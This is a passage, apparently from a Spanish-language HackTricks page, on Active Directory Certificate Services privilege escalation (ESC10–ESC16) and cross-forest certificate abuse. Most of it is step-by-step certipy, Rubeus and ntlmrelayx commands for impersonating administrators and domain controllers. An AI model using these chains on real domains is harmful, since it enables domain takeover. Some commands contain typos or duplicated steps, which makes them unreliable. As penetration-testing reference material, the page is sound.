
Entonces se revierte el `userPrincipalName` de `Jane` a su valor original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar autenticarse con el certificado emitido ahora devuelve el NT hash de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a que el certificado no especifica el dominio:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeos de Certificados Débiles - ESC10

### Explicación

ESC10 hace referencia a dos valores de clave del registro en el controlador de dominio:

- El valor por defecto para `CertificateMappingMethods` bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), previamente establecido en `0x1F`.
- La configuración por defecto para `StrongCertificateBindingEnforcement` bajo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, previamente `0`.

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Caso de abuso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos `GenericWrite` puede ser explotada para comprometer cualquier cuenta B.

Por ejemplo, teniendo permisos `GenericWrite` sobre `Jane@corp.local`, un atacante apunta a comprometer `Administrator@corp.local`. El procedimiento es análogo a ESC9, permitiendo utilizar cualquier plantilla de certificado.

Inicialmente, se obtiene el hash de `Jane` usando Shadow Credentials, explotando el `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, se modifica el `userPrincipalName` de `Jane` a `Administrator`, omitiendo deliberadamente la porción `@corp.local` para evitar una violación de una restricción.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A continuación, se solicita un certificado que habilita la autenticación de cliente como `Jane`, usando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se restaura luego a su valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticarse con el certificado obtenido producirá el NT hash de `Administrator@corp.local`, por lo que es necesario especificar el dominio en el comando debido a la ausencia de información del dominio en el certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con `CertificateMappingMethods` que contiene la bandera de bit `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluyendo cuentas de máquina y el administrador de dominio integrado `Administrator`.

Aquí, el objetivo es comprometer `DC$@corp.local`, empezando por obtener el hash de `Jane` mediante Shadow Credentials, aprovechando el `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
El `userPrincipalName` de `Jane` se establece entonces en `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Se solicita un certificado de autenticación de cliente como `Jane` usando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se restablece a su valor original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticarse a través de Schannel, se utiliza la opción `-ldap-shell` de Certipy, indicando el éxito de la autenticación como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través del LDAP shell, comandos como `set_rbcd` permiten Resource-Based Constrained Delegation (RBCD) attacks, lo que puede comprometer el domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o cuando este no coincida con el `sAMAccountName`, siendo la cuenta por defecto `Administrator@corp.local` un objetivo principal debido a sus privilegios LDAP elevados y a la ausencia por defecto de un `userPrincipalName`.

## Reenvío de NTLM a ICPR - ESC11

### Explicación

Si el servidor CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, permite realizar ataques de relé NTLM sin firma a través del servicio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado y `certipy` mostrará vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Se necesita configurar un servidor relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para los controladores de dominio, debemos especificar `-template` en DomainController.

O usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Autoridad de Certificación (CA) para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si el dispositivo USB está conectado al servidor CA mediante un puerto USB, o a través de un USB device server en caso de que el servidor CA sea una máquina virtual, se requiere una clave de autenticación (a veces denominada "password") para que el Key Storage Provider genere y utilice claves en el YubiHSM.

Esta clave/password se almacena en el registro bajo `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en texto sin cifrar.

Referencia en [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Escenario de abuso

Si la clave privada de la CA está almacenada en un dispositivo USB físico cuando obtienes shell access, es posible recuperar la clave.

Primero, necesitas obtener el certificado de la CA (esto es público) y luego:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.

## OID Group Link Abuse - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite que la política de emisión se agregue a la plantilla de certificado. Los objetos `msPKI-Enterprise-Oid` responsables de emitir políticas pueden descubrirse en el Contexto de nombres de configuración (CN=OID,CN=Public Key Services,CN=Services) del contenedor PKI OID. Una política puede vincularse a un grupo de AD mediante el atributo `msDS-OIDToGroupLink` de este objeto, permitiendo que un sistema autorice a un usuario que presente el certificado como si fuera miembro del grupo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En otras palabras, cuando un usuario tiene permiso para solicitar un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de ese grupo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de abuso

Encuentra un permiso de usuario que pueda usar `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para solicitar la plantilla `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Todo lo que necesita hacer es especificar la plantilla; obtendrá un certificado con derechos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuración vulnerable de renovación de certificados - ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es notablemente exhaustiva. A continuación se reproduce una cita del texto original.

ESC14 aborda vulnerabilidades derivadas del "mapeo explícito débil de certificados", principalmente por el uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o equipo de Active Directory. Este atributo multivalor permite a los administradores asociar manualmente certificados X.509 con una cuenta AD para fines de autenticación. Cuando está poblado, estos mapeos explícitos pueden anular la lógica de mapeo de certificados por defecto, que típicamente se basa en UPNs o nombres DNS en el SAN del certificado, o en el SID incrustado en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Un mapeo "débil" ocurre cuando el valor de cadena usado dentro del atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácilmente adivinable, depende de campos no únicos del certificado o utiliza componentes del certificado que son fácilmente suplantables. Si un atacante puede obtener o crear un certificado cuyos atributos coincidan con un mapeo explícito débilmente definido para una cuenta privilegiada, puede usar ese certificado para autenticarse e impostar esa cuenta.

Ejemplos de cadenas de mapeo `altSecurityIdentities` potencialmente débiles incluyen:

- Mapeo únicamente por un Subject Common Name (CN) común: p. ej., `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con ese CN desde una fuente menos segura.
- Uso de Issuer Distinguished Names (DNs) o Subject DNs excesivamente genéricos sin calificación adicional como un número de serie específico o un subject key identifier: p. ej., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Empleo de otros patrones previsibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que pueda obtener legítimamente o forjar (si ha comprometido una CA o encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` admite varios formatos para el mapeo, tales como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapea por Issuer y Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapea por el valor de la extensión Subject Key Identifier del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapea por número de serie, implícitamente calificado por el Issuer DN) - esto no es un formato estándar, normalmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapea por un nombre RFC822, típicamente una dirección de email, del SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapea por un hash SHA1 de la clave pública cruda del certificado - generalmente fuerte)

La seguridad de estos mapeos depende en gran medida de la especificidad, unicidad y fuerza criptográfica de los identificadores de certificado elegidos en la cadena de mapeo. Incluso con modos de vinculación de certificados fuertes habilitados en los Domain Controllers (que afectan principalmente a mapeos implícitos basados en SAN UPNs/DNS y la extensión SID), una entrada `altSecurityIdentities` mal configurada todavía puede presentar una vía directa para la suplantación si la propia lógica de mapeo es defectuosa o demasiado permisiva.

### Escenario de abuso

ESC14 se dirige a los mapeos explícitos de certificados en Active Directory (AD), específicamente al atributo `altSecurityIdentities`. Si este atributo está establecido (por diseño o mala configuración), los atacantes pueden suplantar cuentas presentando certificados que coincidan con el mapeo.

#### Escenario A: El atacante puede escribir en `altSecurityIdentities`

**Precondición**: El atacante tiene permisos de escritura en el atributo `altSecurityIdentities` de la cuenta objetivo o el permiso para otorgarlo en forma de uno de los siguientes permisos sobre el objeto AD objetivo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Escenario B: El objetivo tiene un mapeo débil vía X509RFC822 (Email)

- **Precondición**: El objetivo tiene un mapeo X509RFC822 débil en altSecurityIdentities. Un atacante puede establecer el atributo mail de la víctima para que coincida con el nombre X509RFC822 del objetivo, inscribir un certificado como la víctima y usarlo para autenticarse como el objetivo.

#### Escenario C: El objetivo tiene un mapeo X509IssuerSubject

- **Precondición**: El objetivo tiene un mapeo explícito X509IssuerSubject en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el subject del mapeo X509IssuerSubject del objetivo. Luego, el atacante puede inscribir un certificado como la víctima y usar este certificado para autenticarse como el objetivo.

#### Escenario D: El objetivo tiene un mapeo X509SubjectOnly

- **Precondición**: El objetivo tiene un mapeo explícito X509SubjectOnly en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el subject del mapeo X509SubjectOnly del objetivo. Luego, el atacante puede inscribir un certificado como la víctima y usar este certificado para autenticarse como el objetivo.

### operaciones concretas
#### Escenario A

Solicitar un certificado de la plantilla de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Guardar y convertir el certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando el certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpieza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## Políticas de aplicación EKUwu (CVE-2024-49019) - ESC15

### Explicación

La descripción en https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc es notablemente exhaustiva. A continuación se cita el texto original.

Usando plantillas de certificado versión 1 predeterminadas integradas, un atacante puede crear un CSR para incluir políticas de aplicación que se prefieran sobre los atributos configurados de Extended Key Usage especificados en la plantilla. El único requisito son los derechos de inscripción, y puede usarse para generar certificados de autenticación de cliente, agente de solicitud de certificado y certificados de firma de código usando la plantilla **_WebServer_**.

### Abuso

Lo siguiente hace referencia a [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)). Haz clic para ver métodos de uso más detallados.

El comando `find` de Certipy puede ayudar a identificar plantillas V1 que potencialmente son susceptibles a ESC15 si la CA no está parcheada.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Escenario A: Direct Impersonation via Schannel

**Paso 1: Solicitar un certificado, inyectando la Application Policy "Client Authentication" y el UPN objetivo.** El atacante `attacker@corp.local` apunta a `administrator@corp.local` usando la plantilla "WebServer" V1 (la cual permite subject suministrado por el enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: La plantilla V1 vulnerable con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para suplantación.

**Paso 2: Autentícate vía Schannel (LDAPS) usando el certificado obtenido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Escenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Paso 1: Solicitar un certificado de una plantilla V1 (con "Enrollee supplies subject"), inyectando la Application Policy "Certificate Request Agent".** Este certificado es para que el atacante (`attacker@corp.local`) se convierta en un enrollment agent. No se especifica ningún UPN para la propia identidad del atacante aquí, ya que el objetivo es la capacidad de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Utiliza el certificado "agent" para solicitar un certificado en nombre de un usuario objetivo privilegiado.** Este es un paso similar a ESC3, utilizando el certificado del Paso 1 como el certificado de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Paso 3: Autenticarse como el usuario privilegiado usando el certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensión de seguridad deshabilitada en CA (globalmente)-ESC16

### Explicación

**ESC16 (Elevación de privilegios mediante la ausencia de la extensión szOID_NTDS_CA_SECURITY_EXT)** se refiere al escenario donde, si la configuración de AD CS no obliga la inclusión de la extensión **szOID_NTDS_CA_SECURITY_EXT** en todos los certificados, un atacante puede explotarlo mediante:

1. Solicitar un certificado **sin SID binding**.

2. Usar este certificado **para autenticación como cualquier cuenta**, por ejemplo, suplantando una cuenta de altos privilegios (p. ej., un Domain Administrator).

También puedes consultar este artículo para aprender más sobre el principio detallado: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

Lo siguiente hace referencia a [este enlace](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Haz clic para ver métodos de uso más detallados.

Para identificar si el entorno de Active Directory Certificate Services (AD CS) es vulnerable a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Paso 1: Leer el UPN inicial de la cuenta de la víctima (Opcional - para restauración).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Paso 2: Actualiza el UPN de la cuenta de la víctima al `sAMAccountName` del administrador objetivo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Paso 3: (Si es necesario) Obtener credenciales de la cuenta "víctima" (p. ej., vía Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: Solicita un certificado como el usuario "victim" desde _cualquier plantilla de autenticación de cliente adecuada_ (p. ej., "User") en la CA vulnerable a ESC16.** Debido a que la CA es vulnerable a ESC16, omitirá automáticamente la extensión de seguridad SID del certificado emitido, independientemente de la configuración específica de la plantilla para esta extensión. Establece la variable de entorno del caché de credenciales de Kerberos (comando de shell):
```bash
export KRB5CCNAME=victim.ccache
```
Luego solicite el certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Paso 5: Revertir el UPN de la cuenta "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Paso 6: Autenticarse como el administrador objetivo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromiso de bosques con certificados explicado en voz pasiva

### Ruptura de relaciones de confianza entre bosques por CAs comprometidas

La configuración para la inscripción entre bosques se hace relativamente sencilla. El certificado de la CA raíz del bosque de recursos es publicado en los bosques de cuentas por los administradores, y los certificados de las CA empresariales del bosque de recursos son añadidos a los contenedores `NTAuthCertificates` y AIA en cada bosque de cuentas. Para aclarar, mediante esta configuración se otorga a la CA del bosque de recursos control total sobre todos los demás bosques para los que gestiona la PKI. Si esta CA fuese comprometida por atacantes, podrían ser falsificados certificados para todos los usuarios tanto del bosque de recursos como de los bosques de cuentas, rompiendo así el límite de seguridad del bosque.

### Privilegios de inscripción concedidos a principales externos

En entornos multi-bosque, se debe tener precaución con las CA empresariales que publican plantillas de certificado que permiten a Authenticated Users o a principales externos (usuarios/grupos ajenos al bosque al que pertenece la CA empresarial) derechos de inscripción y edición.\
Tras la autenticación a través de una relación de confianza, AD añade el Authenticated Users SID al token del usuario. Por tanto, si un dominio posee una CA empresarial con una plantilla que concede derechos de inscripción a Authenticated Users, una plantilla podría ser inscrita por un usuario de otro bosque. Del mismo modo, si una plantilla concede explícitamente derechos de inscripción a un principal externo, se crea así una relación de control de acceso entre bosques, permitiendo que un principal de un bosque se inscriba en una plantilla de otro bosque.

Ambos escenarios incrementan la superficie de ataque de un bosque a otro. Los ajustes de la plantilla de certificado podrían ser explotados por un atacante para obtener privilegios adicionales en un dominio externo.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
